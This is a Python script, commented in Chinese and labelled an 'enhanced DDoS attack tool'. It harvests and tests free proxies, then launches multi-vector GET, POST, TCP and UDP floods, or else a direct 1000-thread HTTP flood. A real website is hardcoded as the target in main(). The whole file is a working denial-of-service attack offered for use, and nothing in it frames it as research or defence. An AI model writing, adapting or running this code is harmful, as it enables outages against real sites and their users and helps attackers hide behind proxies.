#!/usr/bin/env python3
"""
增强版DDoS攻击工具
解决代理数量不足和攻击效果问题
"""

import subprocess
import time
import threading
from concurrent.futures import ThreadPoolExecutor
import requests
import random

class EnhancedDDoSAttack:
    def __init__(self, target_url):
        self.target_url = target_url
        self.proxy_list = []
        self.working_proxies = []
        
    def collect_free_proxies(self):
        """收集免费代理"""
        print("🔍 收集免费代理...")
        
        # 多个免费代理源
        proxy_sources = [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
        ]
        
        all_proxies = set()
        
        for source in proxy_sources:
            try:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    proxies = response.text.strip().split('\n')
                    for proxy in proxies:
                        if proxy.strip() and ':' in proxy:
                            all_proxies.add(proxy.strip())
                    print(f"✅ 从 {source.split('/')[-1]} 获取 {len(proxies)} 个代理")
            except Exception as e:
                print(f"❌ 无法从 {source} 获取代理: {e}")
        
        self.proxy_list = list(all_proxies)
        print(f"📊 总共收集到 {len(self.proxy_list)} 个代理")
        return self.proxy_list
    
    def test_proxy(self, proxy):
        """测试代理可用性"""
        try:
            proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
            response = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
            if response.status_code == 200:
                return proxy
        except:
            pass
        return None
    
    def filter_working_proxies(self):
        """筛选可用代理"""
        print("🔧 筛选可用代理...")
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            results = list(executor.map(self.test_proxy, self.proxy_list))
        
        self.working_proxies = [proxy for proxy in results if proxy]
        print(f"✅ 可用代理数量: {len(self.working_proxies)}")
        return self.working_proxies
    
    def save_proxies_to_file(self, filename="files/proxies/enhanced_proxies.txt"):
        """保存代理到文件"""
        with open(filename, 'w', encoding='utf-8') as f:
            for proxy in self.working_proxies:
                f.write(f"http://{proxy}\n")
        print(f"💾 代理已保存到: {filename}")
        return filename
    
    def enhanced_ddos_attack(self, threads=500, duration=300):
        """增强版DDoS攻击"""
        print(f"🚀 启动增强版DDoS攻击")
        print(f"🎯 目标: {self.target_url}")
        print(f"⚡ 线程数: {threads}")
        print(f"⏱️ 持续时间: {duration}秒")
        
        # 使用多个攻击方法同时进行
        attack_methods = [
            f"python start.py GET {self.target_url} 0 {threads//4} files/proxies/enhanced_proxies.txt {threads//4} {duration}",
            f"python start.py POST {self.target_url} 0 {threads//4} files/proxies/enhanced_proxies.txt {threads//4} {duration}",
            f"python start.py TCP {self.target_url.replace('https://', '').replace('http://', '').split('/')[0]}:80 {threads//4} {duration}",
            f"python start.py UDP {self.target_url.replace('https://', '').replace('http://', '').split('/')[0]}:53 {threads//4} {duration}"
        ]
        
        def run_attack(command):
            try:
                subprocess.run(command, shell=True, timeout=duration+10)
            except subprocess.TimeoutExpired:
                pass
        
        # 同时启动多个攻击
        with ThreadPoolExecutor(max_workers=4) as executor:
            executor.map(run_attack, attack_methods)
        
        print("✅ 增强版DDoS攻击完成")
    
    def direct_http_flood(self, threads=1000, requests_per_thread=100):
        """直接HTTP洪水攻击（绕过代理限制）"""
        print(f"💥 启动直接HTTP洪水攻击")
        print(f"🎯 目标: {self.target_url}")
        print(f"⚡ 线程数: {threads}")
        print(f"📨 每线程请求数: {requests_per_thread}")
        
        attack_count = 0
        
        def flood():
            nonlocal attack_count
            for _ in range(requests_per_thread):
                try:
                    # 随机User-Agent
                    headers = {
                        'User-Agent': random.choice([
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                        ])
                    }
                    
                    response = requests.get(self.target_url, headers=headers, timeout=2)
                    attack_count += 1
                    
                    if attack_count % 100 == 0:
                        print(f"📊 已发送 {attack_count} 个请求")
                        
                except:
                    pass
        
        # 启动洪水攻击
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(flood)
        
        print(f"✅ 直接HTTP洪水攻击完成，总共发送 {attack_count} 个请求")

def main():
    target = "https://www.kjqun.cn/"
    
    # 创建攻击实例
    attacker = EnhancedDDoSAttack(target)
    
    # 1. 收集代理
    attacker.collect_free_proxies()
    
    # 2. 筛选可用代理
    attacker.filter_working_proxies()
    
    # 3. 保存代理
    if len(attacker.working_proxies) > 50:
        attacker.save_proxies_to_file()
        
        # 4. 使用增强版DDoS攻击
        print("\n" + "="*50)
        print("🎯 开始增强版DDoS攻击")
        print("="*50)
        attacker.enhanced_ddos_attack(threads=500, duration=300)
    else:
        print("⚠️ 可用代理不足，使用直接HTTP洪水攻击")
        attacker.direct_http_flood(threads=1000, requests_per_thread=50)

if __name__ == "__main__":
    main()